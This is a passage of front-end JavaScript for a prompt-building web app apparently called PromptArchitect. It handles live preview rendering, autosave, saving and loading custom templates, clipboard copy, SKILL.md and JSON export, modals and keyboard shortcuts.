    if (isStateEmpty(state)) {
      el.previewCode.innerHTML = span('tok-placeholder', escapeHtml(
        activeFormat === 'xml'
          ? '<!-- Start typing in the editor or pick a template to see your prompt compile here. -->'
          : activeFormat === 'json'
            ? '// Start typing in the editor or pick a template to see your prompt compile here.'
            : 'Start typing in the editor or pick a template to see your prompt compile here.'
      ));
      updateMetrics('');
      el.previewLineCount.textContent = '0 lines';
    } else {
      el.previewCode.innerHTML = HIGHLIGHTERS[activeFormat](text);
      updateMetrics(text);
      const lines = text.split('\n').length;
      el.previewLineCount.textContent = `${lines} line${lines === 1 ? '' : 's'}`;
    }
    el.previewFormatLabel.textContent = FORMAT_LABELS[activeFormat];
  }

  function scheduleRender() {
    if (renderFrame !== null) return;
    renderFrame = (window.requestAnimationFrame || ((fn) => setTimeout(fn, 16)))(render);
  }

  function flashPreview() {
    el.previewCode.classList.remove('is-updated');
    void el.previewCode.offsetWidth;
    el.previewCode.classList.add('is-updated');
  }

  /* ------------------------------------------------------------------ *
   * Tabs
   * ------------------------------------------------------------------ */
  function setActiveFormat(format, { focus = false } = {}) {
    if (!FORMATS.includes(format)) return;
    activeFormat = format;
    el.tabs.forEach((tab) => {
      const selected = tab.dataset.format === format;
      tab.classList.toggle('is-active', selected);
      tab.setAttribute('aria-selected', String(selected));
      tab.tabIndex = selected ? 0 : -1;
      if (selected) {
        el.previewPanel.setAttribute('aria-labelledby', tab.id);
        if (focus) tab.focus();
      }
    });
    storage.set(STORAGE_KEYS.tab, format);
    if (renderFrame !== null) {
      (window.cancelAnimationFrame || clearTimeout)(renderFrame);
      renderFrame = null;
    }
    render();
    flashPreview();
  }

  /* ------------------------------------------------------------------ *
   * Autosave
   * ------------------------------------------------------------------ */
  function setAutosave(status, text) {
    el.autosaveStatus.classList.remove('is-saving', 'is-saved', 'is-error');
    el.autosaveStatus.classList.add(`is-${status}`);
    el.autosaveText.textContent = text;
  }

  function saveDraftNow() {
    clearTimeout(autosaveTimer);
    autosaveTimer = null;
    const ok = storage.set(STORAGE_KEYS.draft, { ...collectState(), savedAt: Date.now() });
    if (ok) {
      const time = new Date().toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' });
      setAutosave('saved', `Saved at ${time}`);
    } else {
      setAutosave('error', storageOk ? 'Autosave failed: storage full' : 'Storage unavailable: not saved');
    }
    return ok;
  }

  function scheduleAutosave() {
    setAutosave('saving', 'Saving…');
    clearTimeout(autosaveTimer);
    autosaveTimer = setTimeout(saveDraftNow, AUTOSAVE_DELAY);
  }

  function onEdit(e) {
    if (e && e.target && e.target.matches && e.target.matches('textarea[data-autosize]')) autosize(e.target);
    scheduleRender();
    scheduleAutosave();
  }

  /* ------------------------------------------------------------------ *
   * Templates
   * ------------------------------------------------------------------ */
  function markActiveTemplate() {
    $$('[data-template]', el.builtinTemplates).forEach((card) => {
      card.classList.toggle('is-active', card.dataset.template === currentTemplateId);
      card.setAttribute('aria-pressed', String(card.dataset.template === currentTemplateId));
    });
    $$('[data-custom-template-card]', el.customTemplates).forEach((card) => {
      card.classList.toggle('is-active', card.dataset.id === currentTemplateId);
    });
  }

  function confirmReplace() {
    const state = collectState();
    if (isStateEmpty(state)) return true;
    const stored = storage.get(STORAGE_KEYS.draft, null);
    const matchesTemplate = currentTemplateId && stored && JSON.stringify(normaliseState(stored)) === JSON.stringify(normaliseState(state));
    if (matchesTemplate && isPristineTemplate(state)) return true;
    return window.confirm('Replace your current prompt with this template? Your current draft will be overwritten.');
  }

  function isPristineTemplate(state) {
    if (!currentTemplateId) return false;
    const builtin = BUILTIN_TEMPLATES[currentTemplateId];
    const custom = customTemplates.find((t) => t.id === currentTemplateId);
    const source = builtin || (custom && custom.data);
    if (!source) return false;
    const a = normaliseState({ ...source, templateId: currentTemplateId });
    const b = normaliseState(state);
    return JSON.stringify(prepared(a)) === JSON.stringify(prepared(b));
  }

  function loadBuiltinTemplate(id) {
    const tpl = BUILTIN_TEMPLATES[id];
    if (!tpl) return;
    if (!confirmReplace()) return;
    applyState({ ...tpl, templateId: id });
    saveDraftNow();
    flashPreview();
    closeTemplatesMenu();
    toast(`Loaded "${titleFromSlug(tpl.name)}" template`, 'success');
    el.role.focus({ preventScroll: true });
    if (window.matchMedia('(max-width: 1023.98px)').matches) {
      document.getElementById('editor').scrollIntoView({ behavior: 'smooth', block: 'start' });
    } else {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }

  function loadCustomTemplates() {
    const raw = storage.get(STORAGE_KEYS.templates, []);
    customTemplates = Array.isArray(raw)
      ? raw.filter((t) => t && typeof t.id === 'string' && typeof t.name === 'string' && t.data)
      : [];
  }

  function persistCustomTemplates() {
    return storage.set(STORAGE_KEYS.templates, customTemplates);
  }

  function renderCustomTemplates() {
    el.customTemplates.replaceChildren();
    const sorted = [...customTemplates].sort((a, b) => b.savedAt - a.savedAt);
    sorted.forEach((tpl) => {
      const frag = el.tplCustomCard.content.cloneNode(true);
      const card = $('[data-custom-template-card]', frag);
      card.dataset.id = tpl.id;
      $('[data-custom-name]', card).textContent = tpl.name;
      const data = normaliseState(tpl.data);
      const counts = `${data.constraints.filter((c) => clean(c)).length} rules · ${data.examples.filter((e) => clean(e.input) || clean(e.output)).length} examples`;
      $('[data-custom-meta]', card).textContent = `${formatRelative(tpl.savedAt)} · ${counts}`;
      $('[data-load-custom]', card).setAttribute('aria-label', `Load template ${tpl.name}`);
      $('[data-delete-custom]', card).setAttribute('aria-label', `Delete template ${tpl.name}`);
      el.customTemplates.appendChild(frag);
    });
    el.customEmpty.classList.toggle('hidden', customTemplates.length > 0);
    markActiveTemplate();
    refreshIcons();
  }

  function saveCustomTemplate(name) {
    const trimmed = clean(name).slice(0, 60);
    if (!trimmed) {
      toast('Please give your template a name', 'error');
      return false;
    }
    const data = collectState();
    delete data.templateId;
    const existing = customTemplates.find((t) => t.name.toLowerCase() === trimmed.toLowerCase());
    if (existing && !window.confirm(`A template named "${existing.name}" already exists. Overwrite it?`)) return false;
    const snapshot = customTemplates.map((t) => ({ ...t }));
    const previousTemplateId = currentTemplateId;
    if (existing) {
      existing.data = data;
      existing.savedAt = Date.now();
      currentTemplateId = existing.id;
    } else {
      const id = uid('custom');
      customTemplates.push({ id, name: trimmed, savedAt: Date.now(), data });
      currentTemplateId = id;
    }
    if (!persistCustomTemplates()) {
      customTemplates = snapshot;
      currentTemplateId = previousTemplateId;
      toast(storageOk ? 'Could not save: browser storage is full' : 'Could not save: browser storage is full or blocked', 'error');
      return false;
    }
    renderCustomTemplates();
    saveDraftNow();
    toast(`Saved "${trimmed}" to My Templates`, 'success');
    return true;
  }

  function loadCustomTemplate(id) {
    const tpl = customTemplates.find((t) => t.id === id);
    if (!tpl) return;
    if (!confirmReplace()) return;
    applyState({ ...tpl.data, templateId: id });
    saveDraftNow();
    flashPreview();
    toast(`Loaded "${tpl.name}"`, 'success');
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function deleteCustomTemplate(id) {
    const tpl = customTemplates.find((t) => t.id === id);
    if (!tpl) return;
    if (!window.confirm(`Delete the template "${tpl.name}"? This cannot be undone.`)) return;
    const snapshot = customTemplates;
    customTemplates = customTemplates.filter((t) => t.id !== id);
    if (!persistCustomTemplates()) {
      customTemplates = snapshot;
      toast('Could not delete: browser storage is unavailable', 'error');
      return;
    }
    if (currentTemplateId === id) currentTemplateId = null;
    renderCustomTemplates();
    saveDraftNow();
    toast(`Deleted "${tpl.name}"`, 'info');
  }

  /* ------------------------------------------------------------------ *
   * Clipboard & downloads
   * ------------------------------------------------------------------ */
  async function copyText(text) {
    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(text);
        return true;
      } catch (err) {
        /* fall through to legacy copy */
      }
    }
    const area = document.createElement('textarea');
    area.value = text;
    area.setAttribute('readonly', '');
    area.style.position = 'fixed';
    area.style.opacity = '0';
    area.style.pointerEvents = 'none';
    document.body.appendChild(area);
    area.select();
    let ok = false;
    try {
      ok = document.execCommand('copy');
    } catch (err) {
      ok = false;
    }
    area.remove();
    return ok;
  }

  async function copyPreview() {
    const state = collectState();
    if (isStateEmpty(state)) {
      toast('Nothing to copy yet: fill in at least one block', 'info');
      return;
    }
    compileAll(state);
    const ok = await copyText(compiled[activeFormat]);
    if (ok) {
      toast(`${FORMAT_LABELS[activeFormat]} copied to clipboard`, 'success');
      const icon = el.btnCopyPreview.querySelector('svg, i');
      el.btnCopyPreview.classList.add('text-emerald-400');
      setTimeout(() => el.btnCopyPreview.classList.remove('text-emerald-400'), 1200);
      if (icon) icon.setAttribute('aria-hidden', 'true');
    } else {
      toast('Copy failed: select the preview text and copy manually', 'error');
    }
  }

  function downloadFile(filename, content, mime) {
    const blob = new Blob([content], { type: `${mime};charset=utf-8` });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.rel = 'noopener';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1500);
  }

  function buildSkillMd(state) {
    const p = prepared(state);
    const description = p.description || (p.role ? p.role.split(/(?<=\.)\s/)[0] : 'Custom agent skill built with PromptArchitect.');
    const frontmatter = [
      '---',
      `name: ${p.slug}`,
      `description: ${JSON.stringify(description.replace(/\s+/g, ' '))}`,
      '---',
      ''
    ].join('\n');
    return `${frontmatter}\n${compileMarkdownBody(p)}\n`;
  }

  function buildJsonTemplate(state) {
    const p = prepared(state);
    return JSON.stringify({
      $schema: 'https://reseachrandomv.github.io/promptarchitect/template.schema.json',
      format: 'promptarchitect-template',
      version: 1,
      exportedAt: new Date().toISOString(),
      name: p.slug,
      description: p.description,
      prompt: {
        role: p.role,
        context: p.context,
        constraints: p.constraints,
        outputFormat: p.outputFormat,
        examples: p.examples
      },
      compiled: {
        markdown: compileMarkdownBody(p),
        xml: compileXml(state)
      },
      openai: buildJsonSchemaObject(state)
    }, null, 2);
  }

  function exportSkillMd() {
    const state = collectState();
    if (isStateEmpty(state)) {
      toast('Add some content before exporting', 'info');
      return;
    }
    downloadFile('SKILL.md', buildSkillMd(state), 'text/markdown');
    toast('SKILL.md downloaded', 'success');
  }

  function exportJson() {
    const state = collectState();
    if (isStateEmpty(state)) {
      toast('Add some content before exporting', 'info');
      return;
    }
    const filename = `${prepared(state).slug}.json`;
    downloadFile(filename, buildJsonTemplate(state), 'application/json');
    toast(`${filename} downloaded`, 'success');
  }

  function clearWorkspace() {
    const state = collectState();
    if (isStateEmpty(state)) {
      toast('Workspace is already empty', 'info');
      return;
    }
    if (!window.confirm('Clear every block in the workspace? Saved custom templates are kept.')) return;
    applyState(EMPTY_STATE);
    saveDraftNow();
    toast('Workspace cleared', 'info');
    el.skillName.focus();
  }

  /* ------------------------------------------------------------------ *
   * Modals & dropdown
   * ------------------------------------------------------------------ */
  const FOCUSABLE = 'button:not([disabled]), [href], input:not([disabled]), textarea:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])';

  function openModal(modal, focusTarget) {
    lastFocused = document.activeElement;
    closeTemplatesMenu();
    modal.classList.remove('hidden');
    document.body.style.overflow = 'hidden';
    refreshIcons();
    const target = focusTarget || $(FOCUSABLE, modal);
    if (target) setTimeout(() => target.focus(), 30);
  }

  function closeModal(modal) {
    if (modal.classList.contains('hidden')) return;
    modal.classList.add('hidden');
    if (!$$('.modal').some((m) => !m.classList.contains('hidden'))) document.body.style.overflow = '';
    if (lastFocused && typeof lastFocused.focus === 'function') lastFocused.focus();
  }

  const openModalEl = () => $$('.modal').find((m) => !m.classList.contains('hidden')) || null;

  function trapFocus(e, modal) {
    const nodes = $$(FOCUSABLE, modal).filter((n) => n.offsetParent !== null);
    if (!nodes.length) return;
    const first = nodes[0];
    const last = nodes[nodes.length - 1];
    if (e.shiftKey && document.activeElement === first) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && document.activeElement === last) {
      e.preventDefault();
      first.focus();
    }
  }

  function openHelp() { openModal(el.helpModal); }

  function openSaveTemplate() {
    const state = collectState();
    if (isStateEmpty(state)) {
      toast('Add some content before saving a template', 'info');
      return;
    }
    const existing = customTemplates.find((t) => t.id === currentTemplateId);
    el.templateNameInput.value = existing ? existing.name : (clean(state.name) ? titleFromSlug(slugify(state.name)) : '');
    openModal(el.saveModal, el.templateNameInput);
    setTimeout(() => el.templateNameInput.select(), 40);
  }

  function openTemplatesMenu() {
    el.templatesMenu.classList.remove('hidden');
    el.templatesToggle.setAttribute('aria-expanded', 'true');
    const first = $('[role="menuitem"]', el.templatesMenu);
    if (first) first.focus();
  }

  function closeTemplatesMenu() {
    if (el.templatesMenu.classList.contains('hidden')) return;
    el.templatesMenu.classList.add('hidden');
    el.templatesToggle.setAttribute('aria-expanded', 'false');
  }

  /* ------------------------------------------------------------------ *
   * Keyboard shortcuts
   * ------------------------------------------------------------------ */
  const isTypingTarget = (t) => t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable);

  function onKeydown(e) {
    const modal = openModalEl();
    if (e.key === 'Escape') {
      if (modal) {
        e.preventDefault();
        closeModal(modal);
        return;
      }
      if (!el.templatesMenu.classList.contains('hidden')) {
        closeTemplatesMenu();
        el.templatesToggle.focus();
      }
      return;
    }
    if (e.key === 'Tab' && modal) {
      trapFocus(e, modal);
      return;
    }

    const mod = e.ctrlKey || e.metaKey;
    if (mod && !e.altKey) {
      if (e.code === 'KeyS' || e.key.toLowerCase() === 's') {
        e.preventDefault();
        if (modal) return;
        if (e.shiftKey) exportJson(); else exportSkillMd();
        return;
      }
      if (!e.shiftKey && (e.code === 'KeyK' || e.key.toLowerCase() === 'k')) {
        e.preventDefault();
        if (!modal) clearWorkspace();
        return;
      }
      if (e.shiftKey && (e.code === 'KeyC' || e.key.toLowerCase() === 'c')) {
        e.preventDefault();
        if (!modal) copyPreview();
        return;
      }
      if (!e.shiftKey && ['Digit1', 'Digit2', 'Digit3'].includes(e.code)) {
        e.preventDefault();
        if (!modal) setActiveFormat(FORMATS[Number(e.code.slice(-1)) - 1]);
        return;
      }
    }

    if (e.key === '?' && !mod && !isTypingTarget(e.target) && !modal) {
      e.preventDefault();
      openHelp();
    }
  }

  /* ------------------------------------------------------------------ *
   * Event wiring
   * ------------------------------------------------------------------ */
  function bindEvents() {
    [el.skillName, el.skillDescription, el.role, el.context, el.outputFormat].forEach((input) => {
      input.addEventListener('input', onEdit);
    });
    el.skillName.addEventListener('blur', () => {
      const slug = slugify(el.skillName.value);
      if (slug && slug !== el.skillName.value) {
        el.skillName.value = slug;
        onEdit();
      }
    });

    el.constraintsList.addEventListener('input', onEdit);
    el.constraintsList.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && e.target.matches('[data-constraint-input]')) {
        e.preventDefault();
        const row = e.target.closest('[data-constraint-row]');
        const next = row.nextElementSibling;
        if (next) {
          $('[data-constraint-input]', next).focus();
        } else {
          addConstraint('', { focus: true });
          refreshIcons();
          onEdit();
        }
      } else if (e.key === 'Backspace' && e.target.matches('[data-constraint-input]') && e.target.value === '') {
        const rows = $$('[data-constraint-row]', el.constraintsList);
        if (rows.length > 1) {
          e.preventDefault();
          const row = e.target.closest('[data-constraint-row]');
          const prev = row.previousElementSibling || row.nextElementSibling;
          row.remove();
          renumberConstraints();
          if (prev) $('[data-constraint-input]', prev).focus();
          onEdit();
        }
      }
    });
    el.constraintsList.addEventListener('paste', (e) => {
      if (!e.target.matches('[data-constraint-input]')) return;
      const text = (e.clipboardData || window.clipboardData)?.getData('text') || '';
      const lines = text.split(/\r?\n/)
        .map((l) => l.replace(/^\s*(?:[-*+•]|\d+[.)])\s+/, '').trim())
        .filter(Boolean);
      if (lines.length < 2) return;
      e.preventDefault();
      const input = e.target;
      const before = input.value.slice(0, input.selectionStart);
      const after = input.value.slice(input.selectionEnd);
      input.value = `${before}${lines[0]}`.trim();
      autosize(input);
      let anchor = input.closest('[data-constraint-row]');
      lines.slice(1).forEach((line, i, rest) => {
        const row = addConstraint(i === rest.length - 1 ? `${line}${after}`.trim() : line);
        anchor.after(row);
        anchor = row;
      });
      renumberConstraints();
      refreshIcons();
      $('[data-constraint-input]', anchor).focus();
      onEdit();
      toast(`Added ${lines.length} constraints from clipboard`, 'info');
    });
    el.constraintsList.addEventListener('click', (e) => {
      const btn = e.target.closest('[data-remove-constraint]');
      if (!btn) return;
      const row = btn.closest('[data-constraint-row]');
      removeWithAnimation(row, () => {
        renumberConstraints();
        onEdit();
      });
    });
    el.btnAddConstraint.addEventListener('click', () => {
      addConstraint('', { focus: true });
      refreshIcons();
      onEdit();
    });

    el.examplesList.addEventListener('input', onEdit);
    el.examplesList.addEventListener('click', (e) => {
      const btn = e.target.closest('[data-remove-example]');
      if (!btn) return;
      const pair = btn.closest('[data-example-pair]');
      removeWithAnimation(pair, () => {
        renumberExamples();
        onEdit();
      });
    });
    el.btnAddExample.addEventListener('click', () => {
      addExample({ input: '', output: '' }, { focus: true });
      refreshIcons();
      onEdit();
    });

    el.tabs.forEach((tab, index) => {
      tab.addEventListener('click', () => setActiveFormat(tab.dataset.format));
      tab.addEventListener('keydown', (e) => {
        let nextIndex = null;
        if (e.key === 'ArrowRight') nextIndex = (index + 1) % el.tabs.length;
        if (e.key === 'ArrowLeft') nextIndex = (index - 1 + el.tabs.length) % el.tabs.length;
        if (e.key === 'Home') nextIndex = 0;
        if (e.key === 'End') nextIndex = el.tabs.length - 1;
        if (nextIndex !== null) {
          e.preventDefault();
          setActiveFormat(el.tabs[nextIndex].dataset.format, { focus: true });
        }
      });
    });

    el.btnCopy.addEventListener('click', copyPreview);
    el.btnCopyPreview.addEventListener('click', copyPreview);
    el.btnExportMd.addEventListener('click', exportSkillMd);
    el.btnExportJson.addEventListener('click', exportJson);
    el.btnClear.addEventListener('click', clearWorkspace);
    el.btnHelp.addEventListener('click', openHelp);
    el.btnSaveTemplate.addEventListener('click', openSaveTemplate);

    el.templatesToggle.addEventListener('click', (e) => {
      e.stopPropagation();
      if (el.templatesMenu.classList.contains('hidden')) openTemplatesMenu(); else closeTemplatesMenu();
    });
    el.templatesMenu.addEventListener('click', (e) => {
      const item = e.target.closest('[data-template]');
      if (item) {
        loadBuiltinTemplate(item.dataset.template);
        return;
      }
      if (e.target.closest('a[href^="#"]')) closeTemplatesMenu();
    });
    el.templatesMenu.addEventListener('keydown', (e) => {
      const items = $$('[role="menuitem"]', el.templatesMenu);
      const idx = items.indexOf(document.activeElement);
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        items[(idx + 1) % items.length].focus();
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        items[(idx - 1 + items.length) % items.length].focus();
      }
    });
    document.addEventListener('click', (e) => {
      if (!el.templatesMenu.contains(e.target) && e.target !== el.templatesToggle) closeTemplatesMenu();
    });

    el.builtinTemplates.addEventListener('click', (e) => {
      const card = e.target.closest('[data-template]');
      if (card) loadBuiltinTemplate(card.dataset.template);
    });

    el.customTemplates.addEventListener('click', (e) => {
      const card = e.target.closest('[data-custom-template-card]');
      if (!card) return;
      if (e.target.closest('[data-delete-custom]')) {
        deleteCustomTemplate(card.dataset.id);
      } else if (e.target.closest('[data-load-custom]')) {
        loadCustomTemplate(card.dataset.id);
      }
    });

    el.saveForm.addEventListener('submit', (e) => {
      e.preventDefault();
      if (saveCustomTemplate(el.templateNameInput.value)) closeModal(el.saveModal);
    });

    $$('[data-close-modal]').forEach((node) => {
      node.addEventListener('click', () => {
        const modal = node.closest('.modal');
        if (modal) closeModal(modal);
      });
    });

    document.addEventListener('keydown', onKeydown);

    let resizeTimer = null;
    window.addEventListener('resize', () => {
      clearTimeout(resizeTimer);
      resizeTimer = setTimeout(autosizeAll, 150);
    });

    if (el.jumpFab && el.previewColumn) {
      const label = $('[data-jump-label]', el.jumpFab);
      const setJump = (toEditor) => {
        el.jumpFab.setAttribute('href', toEditor ? '#editor' : '#preview-column');
        el.jumpFab.setAttribute('aria-label', toEditor ? 'Back to editor' : 'Jump to live preview');
        label.textContent = toEditor ? 'Editor' : 'Preview';
        el.jumpFab.dataset.target = toEditor ? 'editor' : 'preview';
      };
      setJump(false);
      if ('IntersectionObserver' in window) {
        const io = new IntersectionObserver((entries) => {
          entries.forEach((entry) => setJump(entry.isIntersecting));
        }, { threshold: 0.15 });
        io.observe(el.previewColumn);
      }
      el.jumpFab.addEventListener('click', (e) => {
        e.preventDefault();
        const target = el.jumpFab.dataset.target === 'editor' ? el.editor : el.previewColumn;
        target.scrollIntoView({ behavior: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth', block: 'start' });
      });
    }

    window.addEventListener('beforeunload', () => {
      if (autosaveTimer) saveDraftNow();
    });

    window.addEventListener('storage', (e) => {
      if (e.key === STORAGE_KEYS.templates) {
        loadCustomTemplates();
        renderCustomTemplates();
      }
    });
  }

  /* ------------------------------------------------------------------ *
   * Init
   * ------------------------------------------------------------------ */
  function init() {
    if (el.footerYear) el.footerYear.textContent = String(new Date().getFullYear());
    if (IS_MAC) $$('kbd[data-mod]').forEach((k) => { k.textContent = '⌘'; });

    storageOk = storage.available();
    loadCustomTemplates();
    renderCustomTemplates();

    const savedTab = storage.get(STORAGE_KEYS.tab, 'markdown');
    activeFormat = FORMATS.includes(savedTab) ? savedTab : 'markdown';

    const draft = storage.get(STORAGE_KEYS.draft, null);
    if (draft && !isStateEmpty(normaliseState(draft))) {
      applyState(draft);
      setAutosave('saved', draft.savedAt ? formatRelative(draft.savedAt).replace('Saved', 'Restored draft ·') : 'Draft restored');
    } else {
      applyState({ ...BUILTIN_TEMPLATES['coding-assistant'], templateId: 'coding-assistant' });
      setAutosave('saved', 'Ready');
    }

    bindEvents();
    setActiveFormat(activeFormat);
    refreshIcons();
    if (!storageOk) {
      setAutosave('error', 'Storage unavailable: not saved');
      toast('Browser storage is full or blocked, so drafts and templates will not be saved. Export your work before closing the tab.', 'error', 7000);
    }
    if (document.fonts && document.fonts.ready) document.fonts.ready.then(autosizeAll);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

  window.PromptArchitect = Object.freeze({
    compileMarkdown,
    compileXml,
    compileJson,
    computeMetrics,
    templates: BUILTIN_TEMPLATES
  });
})();
